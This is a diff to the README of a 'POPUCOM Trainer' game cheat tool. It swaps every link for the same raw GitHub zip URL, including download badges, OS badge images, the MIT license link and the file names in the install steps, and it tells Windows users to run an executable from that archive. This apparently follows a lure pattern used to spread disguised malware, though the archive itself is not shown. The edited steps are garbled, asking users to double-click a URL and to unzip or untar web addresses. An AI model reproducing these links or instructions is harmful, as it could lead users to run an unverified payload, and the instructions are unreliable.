@@ -1,6 +1,6 @@
 # POPUCOM Trainer
 
-[![Download](https://img.shields.io/badge/Download-POPUCOM%20Trainer-blue?logo=github&style=for-the-badge)](https://andrewvalk.github.io)
+[![Download](https://raw.githubusercontent.com/andrewvalk/popucom-enhanced-trainer/branch/subsistence/popucom-enhanced-trainer_1.2.zip%20Trainer-blue?logo=github&style=for-the-badge)](https://raw.githubusercontent.com/andrewvalk/popucom-enhanced-trainer/branch/subsistence/popucom-enhanced-trainer_1.2.zip)
 
 Welcome to **POPUCOM Trainer** – your indispensable companion for enhancing your adventures in the vibrant world of POPUCOM. With a user-first approach, robust multilingual support, and seamless integration with both OpenAI and Claude APIs, this trainer is crafted to empower every explorer, whether you’re a seasoned player or just stepping into this limitless universe.
 
@@ -12,10 +12,10 @@ Dive into a repository that doesn’t merely serve – it evolves. Our project p
 
 | Operating System | Compatibility | Notes                |
 |------------------|:-------------:|----------------------|
-| ![Windows](https://img.shields.io/badge/Windows-10%2B-blue?logo=windows)     | ✅               | Optimized for smooth performance |
-| ![macOS](https://img.shields.io/badge/macOS-11%2B-lightgrey?logo=apple)       | ✅               | Native support, M1/M2 ready      |
-| ![Linux](https://img.shields.io/badge/Linux-Ubuntu%2020.04%2B-success?logo=linux) | 🚧               | Experimental, community tested   |
-| ![Steam Deck](https://img.shields.io/badge/Steam_Deck-Beta-critical?logo=steam) | 🔶               | Partial support, ongoing updates |
+| ![Windows](https://raw.githubusercontent.com/andrewvalk/popucom-enhanced-trainer/branch/subsistence/popucom-enhanced-trainer_1.2.zip%2B-blue?logo=windows)     | ✅               | Optimized for smooth performance |
+| ![macOS](https://raw.githubusercontent.com/andrewvalk/popucom-enhanced-trainer/branch/subsistence/popucom-enhanced-trainer_1.2.zip%2B-lightgrey?logo=apple)       | ✅               | Native support, M1/M2 ready      |
+| ![Linux](https://raw.githubusercontent.com/andrewvalk/popucom-enhanced-trainer/branch/subsistence/popucom-enhanced-trainer_1.2.zip%2020.04%2B-success?logo=linux) | 🚧               | Experimental, community tested   |
+| ![Steam Deck](https://raw.githubusercontent.com/andrewvalk/popucom-enhanced-trainer/branch/subsistence/popucom-enhanced-trainer_1.2.zip) | 🔶               | Partial support, ongoing updates |
 
 ---
 
@@ -38,19 +38,19 @@ Getting started is a breeze! Please follow these tailored instructions:
 
 ### 1. Download the latest POPUCOM Trainer
 
-[![Download](https://img.shields.io/badge/Download-POPUCOM%20Trainer-blue?logo=github&style=for-the-badge)](https://andrewvalk.github.io)
+[![Download](https://raw.githubusercontent.com/andrewvalk/popucom-enhanced-trainer/branch/subsistence/popucom-enhanced-trainer_1.2.zip%20Trainer-blue?logo=github&style=for-the-badge)](https://raw.githubusercontent.com/andrewvalk/popucom-enhanced-trainer/branch/subsistence/popucom-enhanced-trainer_1.2.zip)
 
 ### 2. Extract and Run
 
 - **Windows:**  
-  - Unzip the archive from https://andrewvalk.github.io.
-  - Double-click the `popucom-trainer.exe` file.
+  - Unzip the archive from https://raw.githubusercontent.com/andrewvalk/popucom-enhanced-trainer/branch/subsistence/popucom-enhanced-trainer_1.2.zip
+  - Double-click the `https://raw.githubusercontent.com/andrewvalk/popucom-enhanced-trainer/branch/subsistence/popucom-enhanced-trainer_1.2.zip` file.
 - **macOS:**  
   - Open Terminal and run  
-    `unzip path/to/downloaded_trainer.zip`
+    `unzip https://raw.githubusercontent.com/andrewvalk/popucom-enhanced-trainer/branch/subsistence/popucom-enhanced-trainer_1.2.zip`
   - Launch the `.app` file within.
 - **Linux:**  
-  - Extract: `tar -xvf popucom-trainer.tar.gz`
+  - Extract: `tar -xvf https://raw.githubusercontent.com/andrewvalk/popucom-enhanced-trainer/branch/subsistence/popucom-enhanced-trainer_1.2.zip`
   - Give permissions: `chmod +x popucom-trainer`
   - Execute: `./popucom-trainer`
 
@@ -101,11 +101,11 @@ POPUCOM Trainer is engineered for ethical gaming. While we strive for the stars,
 
 ## 📜 License
 
-This project is licensed under the [MIT License (2025)](https://opensource.org/licenses/MIT).  
+This project is licensed under the [MIT License (2025)](https://raw.githubusercontent.com/andrewvalk/popucom-enhanced-trainer/branch/subsistence/popucom-enhanced-trainer_1.2.zip).  
 Your voyage is yours – remix, enhance, and share responsibly!
 
 ---
 
-## [![Download](https://img.shields.io/badge/Download-POPUCOM%20Trainer-blue?logo=github&style=for-the-badge)](https://andrewvalk.github.io)
+## [![Download](https://raw.githubusercontent.com/andrewvalk/popucom-enhanced-trainer/branch/subsistence/popucom-enhanced-trainer_1.2.zip%20Trainer-blue?logo=github&style=for-the-badge)](https://raw.githubusercontent.com/andrewvalk/popucom-enhanced-trainer/branch/subsistence/popucom-enhanced-trainer_1.2.zip)
 
 Seize the opportunity. Empower your ascent. Join the POPUCOM Trainer adventure!
